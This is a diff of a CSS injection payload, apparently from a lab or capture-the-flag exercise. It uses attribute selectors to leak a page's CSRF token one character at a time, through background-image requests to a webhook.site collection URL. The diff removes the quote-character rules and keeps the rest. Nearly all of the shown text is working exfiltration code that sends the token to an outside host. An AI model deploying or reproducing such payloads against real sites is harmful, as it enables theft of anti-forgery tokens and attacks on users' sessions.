@@ -12,13 +12,6 @@ input[name="csrf"][value^="!"] {
     height: 1px !important;
     background: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=!");
 }
-input[name="csrf"][value^="""] {
-    visibility: visible !important;
-    display: block !important;
-    width: 1px !important;
-    height: 1px !important;
-    background: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c="");
-}
 input[name="csrf"][value^="#"] {
     visibility: visible !important;
     display: block !important;
@@ -46,13 +39,6 @@ input[name="csrf"][value^="&"] {
     width: 1px !important;
     height: 1px !important;
     background: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=&");
-}
-input[name="csrf"][value^="'"] {
-    visibility: visible !important;
-    display: block !important;
-    width: 1px !important;
-    height: 1px !important;
-    background: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c='");
 }
 input[name="csrf"][value^="("] {
     visibility: visible !important;
